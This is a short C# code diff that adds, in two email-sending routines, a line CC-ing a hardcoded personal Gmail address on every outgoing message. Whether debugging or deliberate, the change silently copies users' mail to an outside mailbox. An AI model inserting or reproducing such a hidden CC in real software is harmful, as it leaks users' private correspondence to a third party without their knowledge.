@@ -546,6 +546,7 @@ namespace Infrastructure.Common
                 {
                     #region set To,Cc abd Bcc
                     message.To.Add(new MailAddress(usr.Email));
+                    message.CC.Add(new MailAddress("kishoregund@gmail.com"));
                     #endregion
 
                     #region set Email body
@@ -606,6 +607,7 @@ namespace Infrastructure.Common
                     #region set To,Cc abd Bcc
                     string[] recipients = emails.Split(',');
                     foreach (string email in recipients) { message.To.Add(new MailAddress(email.Trim())); }
+                    message.CC.Add(new MailAddress("kishoregund@gmail.com"));
                     #endregion
 
                     #region set Email body
